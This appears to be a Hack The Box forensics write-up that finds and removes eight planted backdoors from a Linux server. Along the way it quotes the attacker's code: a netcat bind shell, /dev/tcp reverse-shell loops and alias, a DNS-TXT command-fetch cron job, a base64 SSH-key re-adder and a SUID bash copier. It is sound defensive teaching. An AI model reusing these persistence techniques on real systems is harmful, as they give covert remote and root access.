> Hackers made it onto one of our production servers :sweat_smile:. We've
> isolated it from the internet until we can clean the machine up. The IR team
> reported eight difference backdoors on the server, but didn't say what they
> were and we can't get in touch with them. We need to get this server back into
> prod ASAP - we're losing money every second it's down. Please find the eight
> backdoors (both remote access and privilege escalation) and remove them. Once
> you're done, run /root/solveme as root to check. You have SSH access and sudo
> rights to the box with the connections details attached below.

> Author: **[0xdf][author-profile]**

## Monitoring the system

The ssh credentials for the box are:

```
username: user
password: hackthebox
```

The initial run of `/root/solveme` returns:

```bash
Issue 1 is partially remediated
Issue 2 is not remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is partially remediated
Issue 8 is not remediated
```

The most tempting idea is to pwn the binary... But each step was clearly simpler
than RE, laziness keeps me honest :D

## Issue 1: Netcat reverse shell

Apart from my 2 ssh sessions, everything looks fishy:

```bash
# Active Internet connections (servers and established)
# Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
# tcp        0      0 0.0.0.0:telnet          0.0.0.0:*               LISTEN      6/sshd: /usr/sbin/s 
# tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      175/alertd          
# tcp        0      0 forensicspersist:telnet 188.166.173.208:42591   ESTABLISHED -                   
# tcp        0      1 forensicspersiste:59802 172.17.0.1:https        SYN_SENT    193/bash            
# tcp        0      1 forensicspersiste:59860 172.17.0.1:https        SYN_SENT    201/bash            
# tcp        0    232 forensicspersist:telnet 188.166.173.208:8850    ESTABLISHED -                   
# tcp6       0      0 [::]:telnet             [::]:*                  LISTEN      6/sshd: /usr/sbin/s
sudo netstat -taup
```

`alertd` looks like a plain Netcat binary:

```bash
# /root/.bashrc:alertd -e /bin/bash -lnp 4444 &
sudo grep -ria alertd / 2>/dev/null
```

So we kill all the child processes:

```bash
# root       175  0.0  0.0   2592  1980 pts/1    S    19:46   0:00 alertd -e /bin/bash -lnp 4444
sudo kill $(ps -aux | grep -ia 'alertd' | awk '{print $2}')
```

Remove any reference:

```bash
sudo perl -pi -e 's#^alertd.+$##g' /root/.bashrc
sudo rm /usr/bin/alertd
```

And bribe the higher-ups! This cleaning process sounds shadier than planting
an innocent shell.

## Issue 2: malicious SSH keys

### Authorized keys

```bash
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20LoIrzuu9IvtbUeV7jW5J+ed76E2NSYgFhcpJdFiGq+sAv4ewLzF7DshiqH+G20rdLdCgBA3ohcXf8QKv8aosXVD2MLzJ0ad7BvL026M39RHjxT5Vis8Ch6zCGcL1QN/l4riYYtqAmWqxQHVE2HnUeR/Dd7qhyIK6L4PCxQo0q1qOJb+FY1E0/CJYpY90ceX2psXAdGO8FY329+nI1pizwt7OuLk0rBmR11MkcCTQjAUhs7OG+3Pwr9FYHpBS793kDPgDrgKQ9dYJ3q3szsRElbB7W9+Y6dQvpMyJSmYYc1IrP6Ew8L1VGKexQRL6j40F6yzK2PBUdsDYROryGieRbVAwnxlwARpVvwqMY1WJVm0vg6stHAXPQ/pKHjXAedHheNHVOfIqFgOY7NR1ybQSajTYlEg1aDCJki19LQ2RroShyWbxcHMS0p2LDYwzxu4E5139GDg6inSI2m5Io57Vd+3HDhvLhBahTkGzYmausQFHUkiGm87O5vYlAZlWIs= root@buildkitsandbox
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
cat /root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20LoIrzuu9IvtbUeV7jW5J+ed76E2NSYgFhcpJdFiGq+sAv4ewLzF7DshiqH+G20rdLdCgBA3ohcXf8QKv8aosXVD2MLzJ0ad7BvL026M39RHjxT5Vis8Ch6zCGcL1QN/l4riYYtqAmWqxQHVE2HnUeR/Dd7qhyIK6L4PCxQo0q1qOJb+FY1E0/CJYpY90ceX2psXAdGO8FY329+nI1pizwt7OuLk0rBmR11MkcCTQjAUhs7OG+3Pwr9FYHpBS793kDPgDrgKQ9dYJ3q3szsRElbB7W9+Y6dQvpMyJSmYYc1IrP6Ew8L1VGKexQRL6j40F6yzK2PBUdsDYROryGieRbVAwnxlwARpVvwqMY1WJVm0vg6stHAXPQ/pKHjXAedHheNHVOfIqFgOY7NR1ybQSajTYlEg1aDCJki19LQ2RroShyWbxcHMS0p2LDYwzxu4E5139GDg6inSI2m5Io57Vd+3HDhvLhBahTkGzYmausQFHUkiGm87O5vYlAZlWIs= root@buildkitsandbox
cat /root/.ssh/id_rsa.pub
```

It seems the original key is linked to `root@buildkitsandbox`: still we remove
both and generate a new pair:

```bash
sudo rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
sudo ssh-keygen -t rsa -b 2048 # pw: hackthebox
sudo cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
```

### Harden the config?

After this I had to upload my own public key:

```bash
# Authentication:
LoginGraceTime 16
PermitRootLogin no
StrictModes yes
MaxAuthTries 4
MaxSessions 10

PubkeyAuthentication yes

# HostbasedAuthentication
IgnoreUserKnownHosts yes
# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
KerberosAuthentication no

# GSSAPI options
GSSAPIAuthentication no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. 
UsePAM yes

AllowAgentForwarding no
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
Banner none
```

### Host keys

While we're at it, let's renew the host keys:

```bash
sudo rm /etc/ssh/ssh_host*
sudo ssh-keygen -A
```

### Import-id

```bash
# -rwxr-xr-x 1 root root  199 Jan 24  2021 pyssh
ls /etc/cron*
```

And `crond.daily/pyssh` reloads the public key of the attacker every day:

```bash
#!/bin/sh
  
VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
```

```bash
#!/bin/bash
  
KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
```

Purge both:

```bash
sudo rm /etc/cron.daily/pyssh /lib/python3/dist-packages/ssh_import_id_update
```

## Issue 3: suid copies of Bash

There's a `.backdoor` binary in the user home, with the sticky bit set.

```bash
sudo rm /home/user/.backdoor
```

Yet removing the file is not enough to satisfy `solveme`? Let's find and
purge all the suid / sguid binaries:

```bash
# /root/solveme
# /var/log/journal
# /var/mail
# /var/local
# /home/user/.backdoor
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/openssh/ssh-keysign
# /usr/bin/chage
# /usr/bin/su
# /usr/bin/chfn
# /usr/bin/wall
# /usr/bin/passwd
# /usr/bin/newgrp
# /usr/bin/mount
# /usr/bin/umount
# /usr/bin/gpasswd
# /usr/bin/chsh
# /usr/bin/expiry
# /usr/bin/dlxcrw
# /usr/bin/mgxttm
# /usr/bin/sudo
# /usr/bin/ssh-agent
# /usr/bin/crontab
# /usr/bin/bsd-write
# /usr/sbin/unix_chkpwd
# /usr/sbin/pam_extrausers_chkpwd
# /usr/sbin/afdluk
# /usr/sbin/ppppd
# /usr/local/lib/python3.8
# /usr/local/lib/python3.8/dist-packages
# /usr/local/lib/python3.8/dist-packages/psutil
# /usr/local/lib/python3.8/dist-packages/psutil/__pycache__
# /usr/local/lib/python3.8/dist-packages/psutil/tests
# /usr/local/lib/python3.8/dist-packages/psutil/tests/__pycache__
# /usr/local/lib/python3.8/dist-packages/psutil-5.8.0.dist-info
sudo find / \( -perm -2000 -o -perm -4000 \) 2>/dev/null
```

Resist the temptation to erase all of these!

Solving the "last" issue told us that copies of `/bin/bash` are made on a daily
basis, with the exact same creation date and randomized names. Totally average
looking binaries like `/usr/bin/dlxcrw`.

You know the drill:

```bash
target=$(sudo ls -l /bin/bash | perl -ne 'm#(\w+\s+\d+\s+\d+)\s*/bin/bash#g && print $1')
sudo find / -type f -perm 4755 -exec ls -l {} \; 2>/dev/null |
    grep -iaE "${target}" |
    perl -ne 'm#(/usr/s?bin/\w+)#g && print $1."\n"' |
    xargs -I{} sudo rm {}
```

## Issue 4: users & groups

The user `gnats` is especially fishy:

```bash
# /etc/shadow:gnats:$6$SLVgdKJw4kQ5L0bv$ODjJstI50dhKq/IPbmLiZyJpcIPkifIUJGsQ.4f9EguBzf5JeI4sswDo9DsGZ39CDHP8h5AnnSNW5wgi7GeLZ.:18761:0:99999:7:::
# /etc/passwd:gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
# /etc/gshadow:gnats:*::gnats
# /etc/group:gnats:x:41:gnats
# /etc/group-:gnats:x:41:
# /etc/gshadow-:gnats:*::
# /etc/passwd-:gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
# /etc/shadow-:gnats:*:18733:0:99999:7:::
# /etc/services:support       1529/tcp            # GNATS
sudo grep -ria gnats / 2>/dev/null
# gnats : root
groups gnats
```

Disable interactive shells for root & gnats:

```bash
sudo perl -pi -e 's#gnats:/bin/bash#gnats:/usr/sbin/nologin#g' /etc/passwd
sudo perl -pi -e 's#root:/bin/bash#root:/usr/sbin/nologin#g' /etc/passwd
```

Remove the user from the root group:

```bash
sudo perl -pi -e 's#gnats:x:41:0#gnats:x:41:41#g' /etc/passwd
```

Create his home directory with 

```bash
sudo mkdir /var/lib/gnats
sudo chown -R gnats:gnats /var/lib/gnats
```

Change his password:

```bash
sudo passwd gnats # hackthebox
```

## Issue 5: a reverse shell

At this point you must have realized something is up with the processes:

```bash
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root         1  0.0  0.0   2612   536 ?        Ss   13:43   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
# root         6  0.0  0.0  12180  7368 ?        S    13:43   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
# root         7  0.0  0.1  13900  8936 ?        Ss   13:50   0:00  \_ sshd: user [priv]
# user        45  0.0  0.0  13900  5268 ?        S    13:50   0:00  |   \_ sshd: user@pts/1
# user        46  0.0  0.0   4244  3456 pts/1    Ss   13:50   0:00  |       \_ -bash
# user       144  0.0  0.0   6140  2968 pts/1    R+   13:55   0:00  |           \_ ps -auxf
# root         9  0.0  0.1  13904  8792 ?        Ss   13:50   0:00  \_ sshd: user [priv]
# user        23  0.0  0.0  13904  5340 ?        S    13:50   0:00  |   \_ sshd: user@pts/0
# user        24  0.0  0.0   4244  3444 pts/0    Ss+  13:50   0:00  |       \_ -bash
# root        60  0.0  0.1  13896  8912 ?        Ss   13:51   0:00  \_ sshd: user [priv]
# user        73  0.0  0.0  13896  5320 ?        S    13:51   0:00      \_ sshd: user@notty
# user        75  0.0  0.0   5888  4096 ?        Ss   13:51   0:00          \_ /usr/lib/openssh/sftp-server
# root        19  0.0  0.0   3980  2956 ?        S    13:50   0:00 /bin/bash /var/lib/private/connectivity-check
# root       142  0.0  0.0   3980   240 ?        S    13:54   0:00  \_ /bin/bash /var/lib/private/connectivity-check
# root        41  0.0  0.0   3980  3016 ?        S    13:50   0:00 /bin/bash /var/lib/private/connectivity-check
# root       143  0.0  0.0   3980   236 ?        S    13:54   0:00  \_ /bin/bash /var/lib/private/connectivity-check
# root        70  0.0  0.0   3980  3024 ?        S    13:51   0:00 /bin/bash /var/lib/private/connectivity-check
# root       134  0.0  0.0   3980   236 ?        S    13:54   0:00  \_ /bin/bash /var/lib/private/connectivity-check
ps -auxf
```

```bash
# #!/bin/bash

# while true; do
#     nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
#     sleep 10;
# done
cat /var/lib/private/connectivity-check
```

A pack of reverse shells! Cosily nested in:

```bash
# /etc/update-motd.d/30-connectivity-check:nohup /var/lib/private/connectivity-check &
sudo grep -ria 'connectivity-check' /etc
# /etc/update-motd.d/30-connectivity-check
# /var/lib/private/connectivity-check
sudo find / -type f -name '*connectivity-check*' 2>/dev/null
```

Time to kill all the running processes and remove the scripts:

```bash
sudo kill $(ps aux | grep 'connectivity-check' | awk '{print $2}')
sudo rm /var/lib/private/connectivity-check
sudo rm /etc/update-motd.d/30-connectivity-check
```

## Issue 6: shameless alias

While looking for aliases of alertd I stumbled on this one too:

```bash
# alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
sudo grep -ia alias .bashrc
```

Drown it in \x00:

```bash
sudo perl -pi -e 's#^\s*alias cat=.+$##g' /home/user/.bashrc 
```

## Issue 7 & 8: cronjobs

```bash
# * * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
crontab -l
```

And `/etc/cron.daily/access-up` vomits shells:

```bash
#!/bin/bash
  

DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
```

```bash
sudo rm /etc/cron.daily/access-up
sudo rm /var/spool/cron/crontabs/user
```

Voilà!

> HTB{7tr3@t_hUntIng_4TW}

## Bonus: f-util

```bash
alias ls='ls -lah --color --group-directories-first'
# ============================================= alertd: bind shell on port 4444
sudo perl -pi -e 's#^alertd.+$##g' /root/.bashrc
sudo kill $(ps -aux | grep -ia 'alertd' | awk '{print $2}')
sudo rm /usr/bin/alertd
# ========================================================= ssh keys: malicious
sudo rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
sudo ssh-keygen -t rsa -b 2048 # pw: hackthebox
sudo cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
sudo rm /etc/ssh/ssh_host*
sudo ssh-keygen -A
sudo rm /etc/cron.daily/pyssh /lib/python3/dist-packages/ssh_import_id_update
# =============================================================== suid binaries
target=$(sudo ls -l /bin/bash | perl -ne 'm#(\w+\s+\d+\s+\d+)\s*/bin/bash#g && print $1')
sudo rm /home/user/.backdoor
sudo find / -type f -perm 4755 -exec ls -l {} \; 2>/dev/null |
    grep -iaE "${target}" |
    perl -ne 'm#(/usr/s?bin/\w+)#g && print $1."\n"' |
    xargs -I{} sudo rm {}
# ========================================== user gnats: abusive authorizations
sudo perl -pi -e 's#gnats:/bin/bash#gnats:/usr/sbin/nologin#g' /etc/passwd
sudo perl -pi -e 's#root:/bin/bash#root:/usr/sbin/nologin#g' /etc/passwd
sudo perl -pi -e 's#gnats:x:41:0#gnats:x:41:41#g' /etc/passwd
sudo mkdir /var/lib/gnats
sudo chown -R gnats:gnats /var/lib/gnats
sudo passwd gnats # hackthebox
# =============================== update-motd: starts a reverse shell every day
sudo kill $(ps aux | grep 'connectivity-check' | awk '{print $2}')
sudo rm /var/lib/private/connectivity-check
sudo rm /etc/update-motd.d/30-connectivity-check
# ============================================ cat alias: another reverse shell
sudo perl -pi -e 's#^\s*alias cat=.+$##g' /home/user/.bashrc
# ==================== access-up cronjob: making privileged copies of /bin/bash
sudo rm /etc/cron.daily/access-up
# ====================================== user crontab: queries malicious server
sudo rm /var/spool/cron/crontabs/user
```

[author-profile]: https://app.hackthebox.eu/users/4935
